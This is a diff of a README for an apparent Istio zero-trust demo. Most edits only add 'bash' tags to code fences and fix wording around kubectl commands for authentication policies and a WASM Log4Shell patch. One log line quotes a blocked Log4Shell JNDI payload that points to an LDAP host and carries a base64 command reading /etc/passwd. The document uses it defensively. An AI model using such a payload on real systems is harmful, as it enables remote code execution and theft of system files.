@@ -45,7 +45,7 @@ We don't want to allow unauthenticated users to access our application, so let's
 apply a policy that configures the ingress gateway to require authentication against
 the corporate identity Provider:
 
-```
+```bash
 $ kubectl apply -f config/oidc-policy.yaml
 ```
 
@@ -53,7 +53,7 @@ If you inspect [the policy](config/oidc-policy.yaml) file you'll see that it app
 and that it uses a `CUSTOM` target that delegates to the `authservice-grpc` provider.
 The provider is configured in The Istio global mesh config that you can check with:
 
-```
+```bash
 $ kubectl -n istio-system describe configmap istio
 ```
 
@@ -78,7 +78,7 @@ directly to the application sidecar, but for the demo purposes we'll do it just 
 This means that any other service in the cluster could directly reach the application withot going through
 the ingress. We can check it by launching a new pod and accessing the app as follows:
 
-```
+```bash
 $ kubectl run tmp-shell --rm -i --tty --image nicolaka/netshoot -- /bin/bash
 bash-5.1# curl http://vulnerable:8080
 Welcome, anonymous!
@@ -89,7 +89,7 @@ bash-5.1# exit
 Let's create a runtime policy that enforces that our application can only be reached from the ingress gateway.
 Services in the cluster will no longer have direct access to it:
 
-```
+```bash
 $ kubectl apply -f config/runtime-authn.yaml
 ```
 
@@ -99,7 +99,7 @@ it only allows access from a specific source principal. That source principal ma
 
 We can now try to directly access the application again from inside the cluster:
 
-```
+```bash
 $ kubectl run tmp-shell --rm -i --tty --image nicolaka/netshoot -- /bin/bash
 bash-5.1# curl http://vulnerable:8080
 RBAC: access denied
@@ -167,7 +167,7 @@ that comes base64-encoded in the payload.
 
 To prevent this, we will deploy the [WASM patch](wasm-patch) to all the Java applications in the environment:
 
-```
+```bash
 envsubst < config/wasm-patch.yaml | kubectl apply -f -
 ```
 
@@ -180,13 +180,13 @@ Access Denied
 
 We can check that the sidecar proxy in the application pod is rejecting hte traffic via the WASM plugin we jsut deployed:
 
-```
+```bash
 kubectl -n zta-demo logs -l app=vulnerable -c istio-proxy | grep wasm
 2022-01-24T08:35:18.968121Z	info	envoy wasm	wasm log zta-demo.log4shell-patch: access denied for: ${jndi:ldap://log4shell:1389/exec/Y2F0IC9ldGMvcGFzc3dkCg==}
 ```
 
 ## 5. (Optional) NGAC policy enforcement
 
-Now that we have all the primitives we need to implement a Zero Trust Architecture, we can look at how we can apply more high level
-access control policies with NGAC. You can follow the steps in the [ngac/README.md](ngac/README.md) to configure user custom claims
-and enforce access using an NGAC graph.
+Now that we have all the primitives we need to implement a Zero Trust Architecture, we can look at how we can
+apply more high level access control policies with NGAC. You can follow the steps in the [ngac/README.md](ngac/README.md)
+to configure user custom claims and enforce access using an NGAC graph.
